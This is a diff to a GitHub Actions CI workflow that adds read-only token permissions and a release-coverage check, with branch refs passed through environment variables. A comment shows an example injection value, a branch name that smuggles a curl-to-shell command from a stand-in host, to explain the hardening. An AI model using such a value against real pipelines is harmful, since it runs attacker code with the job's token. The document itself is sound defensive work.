@@ -4,12 +4,21 @@ on:
   pull_request:
     branches: [main]
 
+# Read-only by default. This workflow only checks out the branch and runs the
+# suite; nothing it does needs a writable token, and an unstated `permissions:`
+# inherits whatever the repository default is.
+permissions:
+  contents: read
+
 jobs:
   ci:
     runs-on: ubuntu-latest
 
     steps:
       - uses: actions/checkout@v7
+        with:
+          # check:releases diffs the branch against main.
+          fetch-depth: 0
 
       - uses: pnpm/action-setup@v6
 
@@ -31,3 +40,21 @@ jobs:
 
       - name: Test
         run: pnpm test
+
+      # A change to published content with no changeset releasing it version-bumps
+      # nothing, and `pnpm -r publish` skips the package — so the change ships
+      # nowhere while the PR looks complete.
+      #
+      # --head is passed so the check can recognise the Version Packages PR, which
+      # consumes every changeset while rewriting the version fields and pins this
+      # guards, and would otherwise be the one PR that always fails it.
+      #
+      # Both refs travel through `env:` rather than being interpolated into the
+      # script. `${{ }}` is expanded textually before bash parses the line, so a
+      # branch named `fix;curl${IFS}evil|sh` would run as a command with the job's
+      # token, and a branch containing `(` or `;` would break the step outright.
+      - name: Release coverage
+        env:
+          BASE_REF: ${{ github.base_ref }}
+          HEAD_REF: ${{ github.head_ref }}
+        run: pnpm check:releases --base="origin/${BASE_REF}" --head="${HEAD_REF}"
